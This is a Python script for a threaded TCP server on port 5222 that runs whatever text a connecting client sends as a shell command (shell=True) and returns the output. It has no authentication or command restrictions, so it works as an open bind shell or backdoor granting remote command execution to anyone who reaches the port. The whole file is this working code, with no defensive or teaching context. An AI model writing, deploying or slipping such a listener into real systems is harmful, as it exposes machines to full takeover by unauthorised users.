import socket
import threading
import subprocess
import os
# Global Variables
clients = {}
lock = threading.Lock()
# Function to handle individual clients
def handle_client(client_socket, addr):
    with lock:
        clients[addr] = client_socket
        print(f"[NEW CONNECTION] {addr} connected.")
    while True:
        try:
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
            	#continue
              	break
            command = data.strip()
            output = execute_command(command)
            if not output: 
            	output="success"
            	print(f"{output} : {data}")
            else:
            # Display the command and its output on the server
            	print(f"[{addr}] Command: {command}\nOutput:\n{output}")
            # Send the command output back to the client
            client_socket.send(output.encode('utf-8'))
        except Exception as e:
            print(f"[ERROR] {addr} - {str(e)}")
            break
    with lock:
        del clients[addr]
        print(f"[CONNECTION CLOSED] {addr}")
        client_socket.close()
# Function to execute shell commands
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except Exception as e:
        return str(e)
# Main server code
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('192.168.0.195', 5222))
    server.listen(5)
    print("[SERVER STARTED] Waiting for connections...")
    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_thread.start()
# Start the server
start_server()
